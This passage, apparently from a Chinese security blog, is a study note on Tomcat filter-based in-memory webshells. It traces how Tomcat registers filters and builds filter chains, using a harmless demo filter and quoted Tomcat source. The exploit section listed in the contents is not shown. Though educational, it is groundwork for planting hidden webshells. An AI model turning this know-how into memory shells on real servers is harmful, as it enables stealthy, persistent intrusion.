@@ -1,0 +1,868 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)","zh-CN":"复制成功 (*^▽^*)","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ","zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  
+  <title>
+    内存马学习笔记 |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="内存码学习笔记（一）什么是内存马？他不是像文件存储再硬盘中，而是存储到内存中，不能永久储存，但更隐蔽 filter内存马最开始调项目看了很多教程，最后还是用springboot起的项目，  controller随便写，filter中 123456789101112131415161718192021222324252627282930313233343536import org.springfra">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内存马学习笔记">
+<meta property="og:url" content="http://example.com/2024/03/16/%E5%86%85%E5%AD%98%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="内存码学习笔记（一）什么是内存马？他不是像文件存储再硬盘中，而是存储到内存中，不能永久储存，但更隐蔽 filter内存马最开始调项目看了很多教程，最后还是用springboot起的项目，  controller随便写，filter中 123456789101112131415161718192021222324252627282930313233343536import org.springfra">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240023111.png">
+<meta property="og:image" content="https://i.ibb.co/TrL0TD0/QQ-20240312195206.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240022338.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240005179.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240020737.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240020244.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240019582.jpg">
+<meta property="article:published_time" content="2024-03-15T16:26:27.000Z">
+<meta property="article:modified_time" content="2024-04-23T16:38:52.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="filter字节码">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240023111.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/">Home</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/archives">Archives</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/about">About</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/friend">Friend</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="内存马学习笔记">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">内存马学习笔记</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">内存码学习笔记（一）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">filter内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%BC%80%E5%A7%8B%E8%B0%83%E9%A1%B9%E7%9B%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">最开始调项目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.1.2.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90filter%E5%89%8D%E5%A5%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text">分析filter前奏</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tomcat"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Connector"><span class="toc-number">1.1.3.1.1.</span> <span class="toc-text">Connector</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Context%EF%BC%9A"><span class="toc-number">1.1.3.1.2.</span> <span class="toc-text">Context：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90filter%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.4.</span> <span class="toc-text">分析filter流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E4%BB%A3%E7%A0%81%E9%81%87%E5%88%B0%E7%9A%84%E6%9C%89%E5%85%B3filter%E7%9A%84%E7%B1%BB"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">调代码遇到的有关filter的类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A7%8Bexp"><span class="toc-number">1.1.5.</span> <span class="toc-text">开始exp</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="John Doe" class="lazyload">
+  <div class="sidebar-author-name">John Doe</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-内存码学习笔记（一）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2024-03-15T16:26:27.000Z" itemprop="datePublished">2024-03-16</time>
+    <time style="display: none;" id="post-update-time">2024-04-24</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="内存码学习笔记（一）"><a href="#内存码学习笔记（一）" class="headerlink" title="内存码学习笔记（一）"></a>内存码学习笔记（一）</h1><p>什么是内存马？他不是像文件存储再硬盘中，而是存储到内存中，不能永久储存，但更隐蔽</p>
+<h2 id="filter内存马"><a href="#filter内存马" class="headerlink" title="filter内存马"></a>filter内存马</h2><h3 id="最开始调项目"><a href="#最开始调项目" class="headerlink" title="最开始调项目"></a>最开始调项目</h3><p>看了很多教程，最后还是用springboot起的项目，</p>
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240023111.png"></p>
+<p>controller随便写，filter中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.core.annotation.Order;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="comment">//import javax.servlet.ServletContext;</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@WebFilter(urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="meta">@Order(1)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="comment">// 初始化操作</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Before Filter&quot;</span>);</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;After Filter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 销毁操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>application中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.support.SpringBootServletInitializer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.ServletComponentScan;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@ServletComponentScan</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyApplication</span> <span class="keyword">extends</span> <span class="title class_">SpringBootServletInitializer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(MyApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先下断电，然后访问对应接口，然后调试就可以了</p>
+<blockquote>
+<p>多种方法建项目,但底层都是走代码的流程</p>
+<ol>
+<li><p><strong>@WebFilter注解</strong>： 不用写XML配置文件</p>
+</li>
+<li><p><strong>web.xml配置</strong>：</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;filter&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;  </span><br><span class="line">&gt;&lt;filter-class&gt;filter&lt;/filter-class&gt;  </span><br><span class="line">&gt;&lt;/filter&gt;  </span><br><span class="line">&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;  </span><br><span class="line">&gt;&lt;url-pattern&gt;/filter&lt;/url-pattern&gt;  </span><br><span class="line">&gt;&lt;/filter-mapping&gt;&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>Spring框架过滤器注册</strong>： Spring框架提供了自己的方式来注册过滤器，通常结合Spring的IoC容器来管理过滤器对象。在Spring框架中，可以将过滤器作为一个Spring组件（Bean）注册，并通过配置类来进行过滤器的注册。</li>
+</ol>
+</blockquote>
+<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p> Servlet、Listener、Filter 由 <code>javax.servlet.ServletContext</code> 去加载 </p>
+<p> Servlet 3.0 API 允许使 ServletContext 用动态进行注册 </p>
+<blockquote>
+<p>在web容器初始化的时候，也就是建立ServletContext 对象的时候,可以使用<code>add/create</code>方法进行动态注册</p>
+</blockquote>
+<p>Filter 是 Java Web 应用程序中的一种组件，用于在请求到达 Servlet 之前或响应离开 Servlet 之后对请求或响应进行处理。 可以通过实现 <code>javax.servlet.Filter</code> 接口来定义自己的过滤器逻辑。在 Servlet 容器中，Filter 的工作原理是基于回调函数，在请求到达 Servlet 之前和响应离开 Servlet 之后执行相应的方法。Filter 可以读取请求的信息、修改请求的参数、处理请求的内容，并且可以对响应进行相应的处理，但这些操作都是在内存中进行的</p>
+<h3 id="分析filter前奏"><a href="#分析filter前奏" class="headerlink" title="分析filter前奏"></a>分析filter前奏</h3><h4 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h4><p>tomcat先由连接器（ Connector ）从客户端接收请求，然后通过网络接收器（ Acceptor  ）创建对应的Socket对象，再由网络处理器分配processor，最后交给 Servlet  处理（这里servelt就是和我写的controller是一个意思）</p>
+<p>一个服务器上（server）有一个engine，有多个服务（service），一个服务有多个Connector </p>
+<h5 id="Connector"><a href="#Connector" class="headerlink" title="Connector"></a>Connector</h5><p>主要的职责就是负责接收客户端连接和客户端请求的处理加工请求Request和响应Response对象。 </p>
+<p>tomcat有两个典型connector</p>
+<p>1，一个直接侦听来自browser的http请求，一个侦听来自其它WebServer的请求Coyote Http&#x2F;1.1 Connector 在端口8080处侦听来自客户browser的http请求。</p>
+<p>2、另外一个是Coyote JK2 Connector 在端口8009处侦听来自其它WebServer(Apache)的servlet&#x2F;jsp代理请求。</p>
+<h5 id="Context："><a href="#Context：" class="headerlink" title="Context："></a>Context：</h5><p>一个Context对应于一个Web Application，一个WebApplication由一个或者多个Servlet组成。</p>
+<p>Context在创建的时候将根据配置文件$CATALINA_HOME&#x2F;conf&#x2F;web.xml和$WEBAPP_HOME&#x2F;WEB-INF&#x2F;web.xml载入Servlet类，当Context获得请求时，将在自己的映射表(mapping table)中寻找相匹配的Servlet类。如果找到，则执行该类，获得请求的回应，并返回。</p>
+<blockquote>
+<p>Engine：最顶层容器组件，其下可以包含多个 Host。<br>Host：一个 Host 代表一个虚拟主机，其下可以包含多个 Context。<br>Context：一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper。<br>Wrapper： Wrapper是它代表了一个Servlet的执行实例 </p>
+</blockquote>
+<h3 id="分析filter流程"><a href="#分析filter流程" class="headerlink" title="分析filter流程"></a>分析filter流程</h3><p>tomcat初始化的时候会调用<font color='red'>startinternal</font>然后会调用<font color='red'>filterstart</font></p>
+<p><code>standardcontext</code>类的<font color='cornflowerblue'>filterstart:</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">filterStart</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (getLogger().isDebugEnabled()) &#123;</span><br><span class="line">            getLogger().debug(<span class="string">&quot;Starting filters&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Instantiate and record a FilterConfig for each defined filter</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">synchronized</span> (filterDefs) &#123;</span><br><span class="line">            filterConfigs.clear();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">                <span class="keyword">if</span> (getLogger().isDebugEnabled()) &#123;</span><br><span class="line">                    getLogger().debug(<span class="string">&quot; Starting filter &#x27;&quot;</span> + name + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>(<span class="built_in">this</span>, entry.getValue());</span><br><span class="line">                    filterConfigs.put(name, filterConfig);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    t = ExceptionUtils.unwrapInvocationTargetException(t);</span><br><span class="line">                    ExceptionUtils.handleThrowable(t);</span><br><span class="line">                    getLogger().error(sm.getString(<span class="string">&quot;standardContext.filterStart&quot;</span>, name), t);</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ok;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>大概意思是:</p>
+<p>根据<code>filterdef</code>创建ApplicationFilterConfig实例放到<code>filterConfigs</code>中</p>
+<p>然后就会调用filter的init,把所有的filter都初始化</p>
+</blockquote>
+<p>然后就结束了初始化,再次刷新就开始了web服务:</p>
+<p>先创建线程,然后进入tomcat容器,进行 Socket通信 的操作又进行了http的操作,然后是请求处理器的实现</p>
+<p>CoyoteAdapter类的service方法：</p>
+<p><img src="https://i.ibb.co/TrL0TD0/QQ-20240312195206.png"></p>
+<p>service就是tomcat</p>
+<p>container是返回一个 Engine ,默认localhost</p>
+<p>pipline,是tomcat用来管理和组织 Valve 的对象 ,getfirst是获取他的第一个value,如果没有就返回他本身的容器</p>
+<p>进入invoke,里面判断是否接受异步请求,接受就给他设置异步请求</p>
+<p>然后就是通过invoke获取他的第一个value，然后返回他的下一个base子容器</p>
+<blockquote>
+<p><code>Engine</code>&gt;<code>Host</code>&gt;<code>Context</code>&gt;<code>Wrapper</code></p>
+</blockquote>
+<p>在最后一个invoke看到了要找的filter</p>
+<p>StandardWrapperValve类的invoke:</p>
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240022338.png"></p>
+<p>跟进<font color='red'>createfilterchain</font></p>
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240005179.png"></p>
+<p>可以看到这里的逻辑是初始化一个空的filterchain然后获取req的filterchain(req是这个函数的参数，等会回去找找这个参数可不可控)，</p>
+<p>然后req又set了一个空的filterchain</p>
+<p>给这个filterchain set 个servlet</p>
+<p>根据tomcat子容器<code>Wrapper</code>，强转了一个standardContext ，并生成一个<font color='red'>filtermaps</font></p>
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240020737.png"></p>
+<p>在这里可以看到我写的filter在第五个</p>
+<p>根据filtermap名字生成ApplicationFilterConfig，然后加入filterchain</p>
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240020244.png"></p>
+<p>第一次dofilter直接跳到internaldofilter,然后又进到OncePerRequestFilter的dofilter,在poc等于3的时候的跑到我写的dofilter这里触发了calc,然后回到了我写的controller,触发了接口(相当于severlet)</p>
+<p>总结一下：</p>
+<p>dofilter循环调用，最后到了我的dofilter,然后下一个调用到到service然后进入了我写的&#x2F;hello接口</p>
+<h4 id="调代码遇到的有关filter的类"><a href="#调代码遇到的有关filter的类" class="headerlink" title="调代码遇到的有关filter的类"></a>调代码遇到的有关filter的类</h4><p>ApplicationFilterChain</p>
+<blockquote>
+<p>javax.servlet.FilterChain的实现，用于管理特定请求的一组过滤器的执行。当定义的过滤器集全部执行完毕后，对doFilter()的下一次调用将执行servlet的service()方法本身。</p>
+</blockquote>
+<p>OncePerRequestFilter</p>
+<blockquote>
+<p>过滤器基类，旨在保证在任何servlet容器上每个请求调度只执行一次。它提供了一个带有HttpServletRequest和HttpServletResponse参数的doFilterInternal方法。</p>
+<p>从Servlet 3.0开始，过滤器可以作为REQUEST或异步调度的一部分在单独的线程中调用。可以在web.xml中配置过滤器是否应该参与异步分派。然而，在某些情况下，servlet容器采用不同的默认配置。因此，子类可以覆盖shouldNotFilterAsyncDispatch()方法来静态声明</p>
+<p>OncePerRequestFilter just supports HTTP requests</p>
+</blockquote>
+<p>CharacterEncodingFilter</p>
+<blockquote>
